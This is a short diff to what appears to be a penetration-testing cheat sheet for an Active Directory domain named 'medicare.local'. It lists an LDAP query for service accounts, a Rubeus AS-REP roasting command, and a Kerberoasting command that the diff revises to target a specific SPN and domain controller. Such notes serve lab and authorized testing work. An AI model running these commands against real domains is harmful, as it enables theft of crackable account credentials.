@@ -56,4 +56,4 @@ sa-ldapsearch (&(objectClass=user)(servicePrincipalName=*))
 ## rubeus asrep
 rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
 ## rubeus kerberoasting
-rubeus kerberoast /user:http_svc /domain:medicare.local /dc:medicare.local
+rubeus kerberoast /spn:http_svc /domain:medicare.local /dc:dc.medicare.local /user:allegra.dosi
